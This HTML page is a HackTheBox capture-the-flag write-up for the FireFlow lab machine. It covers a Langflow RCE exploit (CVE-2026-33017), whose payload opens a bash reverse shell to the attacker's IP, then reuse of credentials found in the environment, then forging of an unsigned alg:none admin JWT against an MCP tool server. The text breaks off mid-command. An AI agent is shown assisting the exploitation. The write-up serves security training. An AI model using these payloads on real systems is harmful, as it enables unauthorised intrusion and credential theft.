@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FireFlow - HackTheBox - Writeup</title>
+<style>
+  :root{
+    --bg: #0c0f0a;
+    --panel: #10140f;
+    --border: #1f2b1a;
+    --green: #7ee787;
+    --green-dim: #4b8a53;
+    --text: #d7ddd2;
+    --text-dim: #8b968a;
+    --amber: #e3b34d;
+    --red: #ff6b6b;
+    --mono: "JetBrains Mono", "Fira Code", "Consolas", monospace;
+    --sans: "IBM Plex Sans", "Segoe UI", sans-serif;
+  }
+
+  *{box-sizing:border-box;}
+
+  html,body{
+    margin:0;
+    padding:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--sans);
+    line-height:1.65;
+  }
+
+  body{
+    background-image:
+      radial-gradient(circle at 15% 0%, rgba(126,231,135,0.06), transparent 40%),
+      radial-gradient(circle at 85% 20%, rgba(126,231,135,0.04), transparent 35%);
+  }
+
+  .page{
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 64px 28px 120px;
+  }
+
+  /* ---------- Header ---------- */
+  .masthead{
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 28px;
+    margin-bottom: 40px;
+  }
+
+  .kicker{
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--green-dim);
+    letter-spacing: 0.14em;
+    margin: 0 0 14px;
+  }
+
+  .kicker::before{
+    content: "root@writeup:~# ";
+    color: var(--text-dim);
+  }
+
+  h1{
+    font-family: var(--mono);
+    font-size: clamp(28px, 4.5vw, 40px);
+    font-weight: 700;
+    margin: 0 0 10px;
+    color: #f2f5ee;
+    letter-spacing: -0.01em;
+  }
+
+  h1 .accent{ color: var(--green); }
+
+  .meta-row{
+    display:flex;
+    gap: 18px;
+    flex-wrap: wrap;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-top: 12px;
+  }
+
+  .meta-row span::before{
+    content: "";
+    display: inline-block;
+    width: 6px;
+    height: 6px;
+    background: var(--green);
+    border-radius: 50%;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+
+  /* ---------- Note / Aside callouts ---------- */
+  .note{
+    background: rgba(126,231,135,0.05);
+    border-left: 3px solid var(--green-dim);
+    padding: 16px 18px;
+    margin: 28px 0;
+    font-size: 14.5px;
+    color: var(--text-dim);
+    border-radius: 2px;
+  }
+
+  .note strong{
+    display:block;
+    color: var(--green);
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 0.08em;
+    margin-bottom: 6px;
+  }
+
+  .aside{
+    background: rgba(227,179,77,0.06);
+    border: 1px dashed rgba(227,179,77,0.35);
+    padding: 14px 18px;
+    margin: 22px 0;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--amber);
+  }
+
+  .aside .lamp{ margin-right: 8px; }
+
+  /* ---------- Sections ---------- */
+  section{ margin-top: 52px; }
+
+  h2{
+    font-family: var(--mono);
+    font-size: 22px;
+    color: var(--green);
+    margin: 0 0 22px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+    display:flex;
+    align-items:center;
+    gap: 10px;
+  }
+
+  h2::before{
+    content: "❯";
+    color: var(--green-dim);
+    font-size: 18px;
+  }
+
+  h3{
+    font-family: var(--mono);
+    font-size: 16px;
+    color: #f2f5ee;
+    margin: 30px 0 12px;
+  }
+
+  p{
+    margin: 0 0 16px;
+    color: var(--text);
+    font-size: 15.5px;
+  }
+
+  ul{
+    margin: 0 0 16px;
+    padding-left: 22px;
+  }
+  li{ margin-bottom: 8px; font-size: 15.5px; }
+
+  a{ color: var(--green); text-decoration: none; border-bottom: 1px solid rgba(126,231,135,0.35); }
+  a:hover{ border-bottom-color: var(--green); }
+
+  .flag-hit{
+    color: var(--green);
+    font-weight: 600;
+  }
+
+  /* ---------- Terminal / code blocks ---------- */
+  .term{
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin: 20px 0 26px;
+    overflow: hidden;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.35);
+  }
+
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap: 8px;
+    padding: 10px 14px;
+    background: #14180f;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .term-dot{
+    width: 10px; height: 10px; border-radius: 50%;
+  }
+  .term-dot.r{ background:#ff5f56; }
+  .term-dot.y{ background:#ffbd2e; }
+  .term-dot.g{ background:#27c93f; }
+
+  .term-title{
+    margin-left: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-dim);
+  }
+
+  pre{
+    margin: 0;
+    padding: 18px 20px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.6;
+    color: #c9f2cd;
+  }
+
+  code{
+    font-family: var(--mono);
+  }
+
+  .prompt-line{ color: var(--green); }
+  .comment-line{ color: var(--text-dim); }
+  .warn-line{ color: var(--amber); }
+
+  p code, li code{
+    background: rgba(126,231,135,0.08);
+    border: 1px solid rgba(126,231,135,0.15);
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-size: 13.5px;
+    color: var(--green);
+  }
+
+  /* ---------- AI Agent block ---------- */
+  .agent-box{
+    border: 1px solid rgba(126,231,135,0.25);
+    background: linear-gradient(180deg, rgba(126,231,135,0.05), rgba(126,231,135,0.015));
+    border-radius: 8px;
+    margin: 22px 0 26px;
+    overflow: hidden;
+  }
+
+  .agent-header{
+    display:flex;
+    align-items:center;
+    gap: 10px;
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(126,231,135,0.15);
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--green);
+    letter-spacing: 0.04em;
+  }
+
+  .agent-header .dot{
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 6px rgba(126,231,135,0.8);
+  }
+
+  .agent-body{
+    padding: 16px 18px;
+    font-family: var(--mono);
+    font-size: 13.5px;
+    color: #d7ddd2;
+  }
+
+  .agent-body p{ font-family: var(--mono); font-size: 13.5px; margin-bottom: 10px; }
+
+  .placeholder-img{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap: 10px;
+    background: repeating-linear-gradient(45deg, #14180f, #14180f 10px, #171c11 10px, #171c11 20px);
+    border: 1px dashed var(--border);
+    border-radius: 8px;
+    padding: 34px 16px;
+    margin: 20px 0 26px;
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+
+  hr.divider{
+    border: none;
+    border-top: 1px dashed var(--border);
+    margin: 42px 0;
+  }
+
+  .link-block{
+    font-family: var(--mono);
+    font-size: 13.5px;
+    word-break: break-all;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 12px 14px;
+    border-radius: 6px;
+    margin: 14px 0 24px;
+  }
+
+  footer{
+    margin-top: 70px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-dim);
+    text-align:center;
+  }
+
+  @media (max-width: 600px){
+    .page{ padding: 40px 18px 90px; }
+    h1{ font-size: 26px; }
+    pre{ font-size: 12px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header class="masthead">
+    <p class="kicker">writeups/fireflow.md</p>
+    <h1>FireFlow <span class="accent">—</span> HackTheBox</h1>
+    <div class="meta-row">
+      <span>Platform: HackTheBox</span>
+      <span>Difficulty: —</span>
+      <span>Host: fireflow.htb</span>
+    </div>
+  </header>
+
+  <div class="note">
+    <strong>NOTE</strong>
+    In solving this CTF I used an AI agent as a helper tool that carried out specific tasks I asked it to do, such as explaining steps in another language and assisting with syntax. It did not solve the challenge on its own or make decisions about the attack flow — every step and every choice about how to move forward through the machine was made by me, and I understood the reasoning behind each step before executing it. The agent's role was limited to support, not autonomous problem solving.
+  </div>
+
+  <p>I add a line in my hosts file mapping the target IP to <code>fireflow.htb</code> so my browser resolves that hostname to the machine.</p>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+      <span class="term-title">terminal — hosts</span>
+    </div>
+    <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# nano /etc/hosts</span>
+
+<span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# cat /etc/hosts</span>
+127.0.0.1       localhost
+127.0.1.1       omar
+10.129.244.214    fireflow.htb</pre>
+  </div>
+
+  <section>
+    <h2>Reconnaissance</h2>
+
+    <p>I run an nmap scan against the target to discover which ports are open. I start with a quick scan covering the essential ports, then follow up with a more detailed scan using service and version detection on the ports that came back open, so I can see what software is running on each one.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">nmap -sV -sS -Pn</span>
+      </div>
+      <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam]</span>
+<span class="prompt-line">└─# nmap -sV -sS -Pn 10.129.244.214</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-15 04:15 EDT
+<span class="comment-line">Stats: 0:00:52 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span>
+<span class="comment-line">SYN Stealth Scan Timing: About 74.55% done; ETC: 04:16 (0:00:18 remaining)</span>
+<span class="comment-line">Stats: 0:07:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span>
+<span class="comment-line">SYN Stealth Scan Timing: About 99.99% done; ETC: 04:23 (0:00:00 remaining)</span>
+Host is up (0.23s latency).
+Not shown: 992 closed tcp ports (reset)
+PORT      STATE    SERVICE   VERSION
+22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+443/tcp   open     ssl/http  nginx
+9100/tcp  filtered jetdirect
+30000/tcp filtered ndmps
+30718/tcp filtered unknown
+30951/tcp filtered unknown
+31038/tcp filtered unknown
+31337/tcp filtered Elite
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 521.46 seconds</pre>
+    </div>
+
+    <p>The scan shows two open ports: port 443, which is running a web server, and port 22, which is running SSH. I asked the agent to check the SSH service on port 22 to identify its exact version, then search for any known CVEs associated with that version that could provide initial access to the machine, and to organize the findings into a table showing the CVE ID, a short description, and whether it could lead to authentication bypass or remote code execution.</p>
+
+    <div class="placeholder-img">🖼 image.png — agent's CVE summary table for OpenSSH 9.6p1</div>
+
+    <p>Unfortunately, most of the CVEs found do not provide a shell directly, and some of them actually require valid credentials to be used in the first place, which I do not have yet. I decide to shift my focus to port 443 and investigate the web application instead, since it is more likely to give an initial foothold.</p>
+
+    <p>When I open the main site <code>fireflow.htb</code> and browse through it, clicking on a tab redirects me to the subdomain <code>flow.fireflow.htb</code>. I take this new subdomain and add it alongside the main domain in my hosts file so it resolves correctly as well.</p>
+
+    <div class="placeholder-img">🖼 image.png — redirect to flow.fireflow.htb</div>
+
+    <p>I ask the agent to run enumeration on the target covering files, directories, and subdomains, so I can map out the attack surface of the web application and find any hidden paths or endpoints that are not linked directly on the site.</p>
+
+    <div class="placeholder-img">🖼 image.png — enumeration results</div>
+
+    <p>At this point I decide to focus on the subdomain. I find that the subdomain is still under construction, and it turns out to be an AI application.</p>
+
+    <div class="placeholder-img">🖼 image.png — subdomain under construction</div>
+
+    <p>When I click on that icon it takes me to the page <code>langflow.org</code>, which turns out to be a software framework — specifically a low-code visual platform used for building AI applications and AI agents. This tells me the target machine is likely running an instance of Langflow, so I now know what technology I am dealing with and can start looking for known vulnerabilities specific to it.</p>
+
+    <p>I ask the agent to search for known CVEs affecting this software and to focus specifically on any CVE that leads to remote code execution, since that would give me the strongest path to gaining access to the machine.</p>
+
+    <div class="agent-box">
+      <div class="agent-header"><span class="dot"></span> AGENT · Hermes</div>
+      <div class="agent-body">
+        <p>Confirmed: CVE-2026-33017 applies exactly — Langflow 1.8.2, public flow UUID 7d84d636-..., and the endpoint responds 400 "No client_id cookie found" exactly as the advisory describes. Auto-login is disabled, but we already have the public flow UUID from the playground link, so it's chainable. Let me verify RCE:</p>
+      </div>
+    </div>
+
+    <p>At this point I decide to search for it myself on Google and on well-known vulnerability databases to check whether it is actually useful or not. I find a known CVE that actually leads to remote code execution, with details available on GitHub under the repository <code>CVE-2026-33017</code>:</p>
+
+    <div class="link-block">🔗 <a href="https://github.com/EQSTLab/CVE-2026-33017" target="_blank" rel="noopener">github.com/EQSTLab/CVE-2026-33017</a></div>
+
+    <p>I decide to verify this myself on Google and on well-known vulnerability databases to check whether it is actually applicable before acting on it. Once I confirm it matches, I ask the agent to attempt exploitation and to try running the <code>id</code> command on the system to confirm code execution, while I try to exploit it myself in parallel.</p>
+
+    <div class="placeholder-img">🖼 image.png — agent confirming id output</div>
+  </section>
+
+  <section>
+    <h2>Initial Access</h2>
+
+    <p>I take the code responsible for getting a reverse shell, then I open a listener on port 4444 and I successfully get a shell on the target machine.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">CVE-2026-33017 — malicious flow payload</span>
+      </div>
+      <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# curl -sk -X POST \</span>
+  'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
+  -H 'Content-Type: application/json' \
+  -b 'client_id=&lt;client_id_from_browser&gt;' \
+  -d '{
+    "data": {
+      "nodes": [{
+        "id": "Evil",
+        "type": "genericNode",
+        "position": {"x":0,"y":0},
+        "data": {
+          "id": "Evil",
+          "type": "EvilComp",
+          "node": {
+            "template": {
+              "code": {
+                "type": "code",
+                "required": true,
+                "show": true,
+                "multiline": true,
+                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >&amp; /dev/tcp/10.10.14.139/4444 0>&amp;1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass EvilComp(Component):\n    display_name=\"Evil-X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
+                "name": "code",
+                "password": false,
+                "advanced": false,
+                "dynamic": false
+              },
+              "_type": "Component"
+            },
+            "description": "Evil-X",
+            "base_classes": ["Data"],
+            "display_name": "EvilComp",
+            "name": "EvilComp",
+<span class="comment-line">&lt;....</span></pre>
+    </div>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">nc listener → shell</span>
+      </div>
+      <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# nc -lvnp 4444</span>
+listening on [any] 4444 ...
+connect to [10.10.14.139] from (UNKNOWN) [10.129.244.214] 51232
+<span class="warn-line">bash: cannot set terminal process group (1525): Inappropriate ioctl for device</span>
+<span class="warn-line">bash: no job control in this shell</span>
+www-data@fireflow:/var/lib/langflow$</pre>
+    </div>
+
+    <p><span class="flag-hit">I now have a shell on the server ✅</span></p>
+  </section>
+
+  <section>
+    <h2>Lateral Movement</h2>
+
+    <p>After moving around through the directories and checking the files, I find something important.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">env dump</span>
+      </div>
+      <pre>www-data@fireflow:/home$ which env
+which env
+/usr/bin/env
+www-data@fireflow:/home$ /usr/bin/env
+/usr/bin/env
+LANGFLOW_LOG_LEVEL=warning
+USER_AGENT=langflow
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+LANGFLOW_NEW_USER_IS_ACTIVE=False
+SERVER_SOFTWARE=gunicorn/22.0.0
+PWD=/home
+LOGNAME=www-data
+LANGFLOW_SUPERUSER=langflow
+SYSTEMD_EXEC_PID=1525
+LANGFLOW_CONFIG_DIR=/var/lib/langflow
+HOME=/var/www
+LANG=en_US.UTF-8
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
+INVOCATION_ID=abd5665bf83b4b91a9787290b6f651b5
+TERM=xterm
+USER=www-data
+LANGFLOW_AUTO_LOGIN=False
+SHLVL=3
+<span class="warn-line">LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll</span>
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
+JOURNAL_STREAM=8:11156
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
+LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
+_=/usr/bin/env
+OLDPWD=/</pre>
+    </div>
+
+    <p>When I look at this output I find extremely sensitive information — most importantly a Langflow superuser username set to <code>langflow</code> and a Langflow superuser password stored right there in plain text.</p>
+
+    <div class="aside"><span class="lamp">💡</span>LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll</div>
+
+    <p>At this point I want to test whether the agent can search for this kind of sensitive information on the system and find it on its own without me giving it any hints or telling it where the file is located, so I ask it to search for any credentials and see whether it can actually reach them or not.</p>
+
+    <div class="placeholder-img">🖼 image.png — agent locating the credentials unaided</div>
+
+    <p>These credentials are for logging into the Langflow admin interface at <code>flow.fireflow.htb</code>, not for a system-level account, so I don't use them further at this stage — I already have a shell through the RCE. What I still need is a username belonging to an actual person on the server, so I search inside <code>/etc/passwd</code>.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">cat /etc/passwd</span>
+      </div>
+      <pre>www-data@fireflow:/home$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:102:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:103:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
+tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:988::/var/log/laurel:/bin/false
+<span class="prompt-line">nightfall:x:1000:1000::/home/nightfall:/bin/bash</span>
+dnsmasq:x:996:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+www-data@fireflow:/home$</pre>
+    </div>
+
+    <p>Now I found user <code>nightfall</code>. Since I now know the actual system username, I try something very common in penetration testing: the fact that many users, or even the administrator setting up the server, reuse the same password in multiple places.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">ssh nightfall@target</span>
+      </div>
+      <pre><span class="prompt-line">──(root㉿omar)-[/home/mesalam]</span>
+<span class="prompt-line">└─# ssh nightfall@10.129.244.214</span>
+nightfall@10.129.244.214's password:
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue Sep 15 11:09:03 AM UTC 2026
+
+  System load:           0.24
+  Usage of /:            85.1% of 15.58GB
+  Memory usage:          60%
+  Swap usage:            0%
+  Processes:             259
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.244.214
+  IPv6 address for eth0: dead:beef::a0de:adff:fee1:bf20
+
+  => / is using 85.1% of 15.58GB
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+2 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+nightfall@fireflow:~$</pre>
+    </div>
+
+    <p>Now I am able to log into the system as a real user through SSH.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">ls -lah ~</span>
+      </div>
+      <pre>nightfall@fireflow:~$ ls -lah
+total 36K
+drwxr-x--- 5 nightfall nightfall 4.0K May 12 15:28 .
+drwxr-xr-x 3 root      root      4.0K May 12 15:28 ..
+lrwxrwxrwx 1 root      root         9 May 12 14:24 .bash_history -> /dev/null
+-rw-r--r-- 1 nightfall nightfall  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 nightfall nightfall 3.7K Mar 31  2024 .bashrc
+drwx------ 2 nightfall nightfall 4.0K May 12 15:28 .cache
+drwxrwxr-x 3 nightfall nightfall 4.0K May 12 15:28 .local
+<span class="prompt-line">drwx------ 2 nightfall nightfall 4.0K Sep 15 08:13 .mcp</span>
+-rw-r--r-- 1 nightfall nightfall  807 Mar 31  2024 .profile
+-rw-r----- 1 root      nightfall   33 Sep 15 08:14 user.txt</pre>
+    </div>
+
+    <p>I display the flag to confirm it:</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">cat user.txt</span>
+      </div>
+      <pre>nightfall@fireflow:~$ cat user.txt
+<span class="prompt-line">8e8gthgetw5ef8w44fw8451f</span></pre>
+    </div>
+
+    <p><span class="flag-hit">I have obtained the user flag ✅</span></p>
+  </section>
+
+  <section>
+    <h2>Privilege Escalation</h2>
+
+    <p>Now that I have gained access as a regular user on the system, I decide to browse through the files and directories to look for a way to escalate my privileges. As soon as I list the hidden files, a directory called <code>.mcp</code> catches my attention.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">~/.mcp</span>
+      </div>
+      <pre>nightfall@fireflow:~$ cd .mcp
+nightfall@fireflow:~/.mcp$ ls -lah
+total 12K
+drwx------ 2 nightfall nightfall 4.0K Sep 15 08:13 .
+drwxr-x--- 5 nightfall nightfall 4.0K May 12 15:28 ..
+-rw------- 1 nightfall nightfall  147 Sep 15 08:13 config.json</pre>
+    </div>
+
+    <p>Inside it I find a single file, so I open it to see what is inside.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">cat config.json</span>
+      </div>
+      <pre>nightfall@fireflow:~/.mcp$ cat config.json
+{
+  "server": "http://10.129.244.214:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  <span class="warn-line">"password": "Langfl0w@mcp2026!"</span>
+}</pre>
+    </div>
+
+    <p>This is a configuration file for a completely different program: MCP, a protocol used in AI applications to enable models to use external tools. It includes details for a new server running on port 30080, along with a username and password for access.</p>
+
+    <p>I make a simple request just to understand exactly what this service is, and the response comes back with a very valuable piece of information.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">curl /api/v1/version</span>
+      </div>
+      <pre>nightfall@fireflow:~/.mcp$ curl -i http://10.129.244.214:30080/api/v1/version
+HTTP/1.1 200 OK
+date: Tue, 15 Sep 2026 11:34:38 GMT
+server: uvicorn
+content-length: 322
+content-type: application/json
+
+{"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer &lt;token&gt;","supported_algorithms":["HS256","<span class="warn-line">none</span>"]},"docs":"/docs","endpoints":["POST /mcp [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools [admin]"]}nightfall@fireflow:~/.mcp$</pre>
+    </div>
+
+    <p>This is the most important point in the whole thing: the server states that it supports two types of authentication for its JWT algorithms.</p>
+    <ul>
+      <li>The first is <strong style="color:var(--green)">HS256</strong>, a secure method that requires a secret key to sign the token properly.</li>
+      <li>The second is <strong style="color:var(--amber)">none</strong>, which is the dangerous part — meaning the server might accept a token that has no cryptographic signature at all.</li>
+    </ul>
+    <p>It also reveals the available endpoints: login, viewing tools, adding tools (restricted to admins only), and executing tools.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">POST /api/v1/auth</span>
+      </div>
+      <pre>nightfall@fireflow:~/.mcp$ curl -X POST http://10.129.244.214:30080/api/v1/auth \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
+{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}</pre>
+    </div>
+
+    <p>I successfully obtain a normal JWT token that carries the role <code>user</code>.</p>
+
+    <div class="placeholder-img">🖼 image.png — decoded JWT (role: user)</div>
+
+    <p>I check which tools can be accessed using the token I just created.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">GET /api/v1/tools</span>
+      </div>
+      <pre>TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps"
+
+curl -s http://10.129.244.214:30080/api/v1/tools \
+  -H "Authorization: Bearer $TOKEN"
+[{"name":"ping_host","description":"Ping a target host 3 times and return ICMP output."},{"name":"get_metrics_summary","description":"Return a summary of system memory and load average from /proc."},{"name":"list_running_tasks","description":"List the top 20 running processes sorted by CPU usage."},{"name":"pwncheck","description":"test"},{"name":"hello","description":"t"},{"name":"beep","description":"t"},{"name":"check","description":"t"}]nightfall@fireflow:~/.mcp$</pre>
+    </div>
+
+    <p>Exactly what I expect — the response comes back with the list of available tools, confirming that the current token with the role <code>user</code> is working and is at least allowed to make GET requests to the tools endpoint.</p>
+
+    <p>Now I try to craft a JWT token with admin privileges so that I have the ability to make POST requests as well, not just GET requests.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">forge alg:none token</span>
+      </div>
+      <pre><span class="prompt-line">┌──(root㉿omar)-[/home/mesalam/HTB]</span>
+<span class="prompt-line">└─# python3 - &lt;&lt;'EOF'</span>
+import jwt
+print(jwt.encode(
+    {"sub": "langflow-bot", "role": "admin"},
+    key="",
+    algorithm="none"
+))
+EOF
+<span class="prompt-line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.</span></pre>
+    </div>
+
+    <p>Now that I have crafted a JWT token with admin privileges, I try to create a new tool using these privileges.</p>
+
+    <div class="term">
+      <div class="term-bar">
+        <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+        <span class="term-title">POST /api/v1/tools [admin]</span>
+      </div>
+      <pre>nightfall@fireflow:~/.mcp$ curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
